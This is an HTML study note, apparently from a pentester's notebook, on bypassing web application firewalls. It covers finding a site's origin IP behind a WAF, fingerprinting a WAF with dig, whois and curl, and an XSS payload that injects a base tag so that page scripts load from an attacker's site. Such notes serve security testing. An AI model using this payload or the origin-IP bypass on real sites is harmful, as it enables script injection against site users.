<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Bypass Web Application Firewall (WAF)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>Bypass Web Application Firewall (WAF)</h1><br /><strong>
      <h3>Web Application Firewall (WAF)</h3>
    </strong><br />The most common problem we run into with Payloads is filters and WAFs (Web Application Firewall).
    WAFs are usually the trickiest to bypass because they are usually running some type of regex and if it&#39;s up to
    date, it&#39;ll be looking for everything. <br /><br />• List of WAF Bypass that are been succeed in the past: <a
      href="https://github.com/0xInfection/Awesome-WAF" target="_blank">https://github.com/0xInfection/Awesome-WAF</a><br />• List of
    payloads: <a
      href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank">https://github.com/swisskyrepo/PayloadsAllTheThings</a><br /><br /><strong>Find
      real IP of the target</strong><br />Sometime WAF hide the real ip of the target behind the WAF and an attacker
    cannot directly attack it.<br /> 1) Find real IP of the target using some OSINT, dig DNS history,...<br /> 2) update
    <strong>/etc/hosts</strong><br />for more see here:<br /> ◇ <a
      href="https://medium.com/@_sathishshan/bypassing-web-application-firewall-waf-43b2bb3da1fc" target="_blank">https://medium.com/@_sathishshan/bypassing-web-application-firewall-waf-43b2bb3da1fc</a><br />
    ◇ <a
      href="https://docs.sucuri.net/website-firewall/troubleshooting/bypassing-the-waf-for-testing/" target="_blank">https://docs.sucuri.net/website-firewall/troubleshooting/bypassing-the-waf-for-testing/</a><br />
    ◇ <a
      href="https://blog.detectify.com/2019/07/31/bypassing-cloudflare-waf-with-the-origin-server-ip-address/" target="_blank">https://blog.detectify.com/2019/07/31/bypassing-cloudflare-waf-with-the-origin-server-ip-address/</a><br />
    ◇ <a
      href="https://infosecwriteups.com/finding-the-origin-ip-behind-cdns-37cd18d5275" target="_blank">https://infosecwriteups.com/finding-the-origin-ip-behind-cdns-37cd18d5275</a><br /><br /><br /><strong><span
        style="color:#a5452a;">example:</span></strong><strong> Akamai WAF</strong><br />Akamai WAF in an old version
    <span style="text-decoration:underline;">was only doing checks on the </span><span
      style="color:#ff0000;text-decoration:underline;">parameter values</span>, and not the actual parameters names. The
    target in question was reflecting the parameter names and values as JSON.<br />
    <code>&lt;script&gt;{“</code><code><span style="color:#ff0000;">paramname</span></code><code>”:”</code><code><span style="color:#0000ff;">value</span></code><code>”}&lt;/script&gt;</code><br />We
    could have used the payload below to change any links after the payload to mysite which enable us to run our own
    javascript (since it changed &lt;script src=&gt; links to my website).<br /> ◇ PAYLOAD → <span
      style="color:#ff0000;">?&quot;&gt;&lt;/script&gt;&lt;base c==href=https:\mysite&gt;</span><br /> ◇ PAYLOAD URL
    ENCODED → <span
      style="color:#ff0000;">?&quot;&gt;&lt;/script&gt;&lt;base%20c%3D=href%3Dhttps:\mysite&gt;</span><br />
    <code>&lt;script&gt;{“</code><code><span style="color:#ff0000;">?&quot;&gt;&lt;/script&gt;&lt;base%20c%3D=href%3Dhttps:\mysite&gt;</span></code><code>”:”</code><code><span style="color:#0000ff;">&lt;img src=&quot;attackerScript.js&quot;&gt;</span></code><code>”}&lt;/script&gt;</code><br />
    <br /><br /><strong>How know if the target domain is using a WAF provider?</strong><br />1. Find the A record<br />
    <div class="codebox">
      <div class="codebox">dig&nbsp;[domain]&nbsp;A</div>
    </div><br /> <a href=""><img src="images/1601-1.png" alt="images/1601-1.png" /></a><br />2. Know who own the IP
    address we found<br /> ◇ whois<br />
    <div class="codebox">
      <div class="codebox">whois&nbsp;<span style="color:#000000;font-weight:400">[</span>IpAddress_Arecord<span
          style="color:#000000;font-weight:400">]</span></div>
    </div><br /> <a href=""><img src="images/1601-2.png" alt="images/1601-2.png" /></a><br /> ◇ Use curl to fetch the
    headers only on the domain<br />
    <div class="codebox">
      <div class="codebox">curl&nbsp;-i&nbsp;<span style="color:#000000;font-weight:400">[</span>domain<span
          style="color:#000000;font-weight:400">]</span></div>
    </div><br /> <a href=""><img src="images/1601-3.png"
        alt="images/1601-3.png" /></a><br /><br /><br /><strong>Bibliography:</strong><br /><a
      href="https://github.com/vincentcox/bypass-firewalls-by-DNS-history" target="_blank">https://github.com/vincentcox/bypass-firewalls-by-DNS-history</a><br />Zseano
    Methodology: <a
      href="https://www.bugbountyhunter.com/methodology/" target="_blank">https://www.bugbountyhunter.com/methodology/</a><br />Base
    tag: <a
      href="https://www.w3schools.com/tags/tag_base.asp#:~:text=The%20tag%20specifies%20the,inside%20the%20element." target="_blank">https://www.w3schools.com/tags/tag_base.asp#:~:text=The%20tag%20specifies%20the,inside%20the%20element.</a><br /><a
      href="https://www.bugbountytips.tech/2020/05/26/xss-payload-akamai-waf-bypass-by-zseano-scriptbase%20c%3Dhref%3Dhttps/" target="_blank">https://www.bugbountytips.tech/2020/05/26/xss-payload-akamai-waf-bypass-by-zseano-scriptbase%20c%3Dhref%3Dhttps/</a>
  </div>
</body>

</html>